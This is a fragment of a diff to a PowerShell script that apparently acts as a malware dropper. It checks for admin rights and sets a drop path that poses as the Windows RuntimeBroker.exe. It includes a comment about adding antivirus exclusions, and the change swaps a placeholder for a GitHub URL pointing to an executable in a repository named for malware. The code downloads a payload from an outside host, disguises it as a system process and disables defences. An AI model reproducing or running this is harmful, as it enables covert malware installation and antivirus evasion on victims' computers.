@@ -17,7 +17,7 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 $d = Join-Path $env:LOCALAPPDATA 'Microsoft\WindowsApps\RuntimeBroker'
 $n = 'RuntimeBroker.exe'
 $p = Join-Path $d $n
-$u = 'https://github.com/<username>/<projectname>/raw/refs/heads/main/letsgo.exe'
+$u = 'https://github.com/woohoomalware/WeAreDanger/raw/refs/heads/main/letsgo.exe'
 
 # AV exclusion (direct cmdlet calls)
 try {
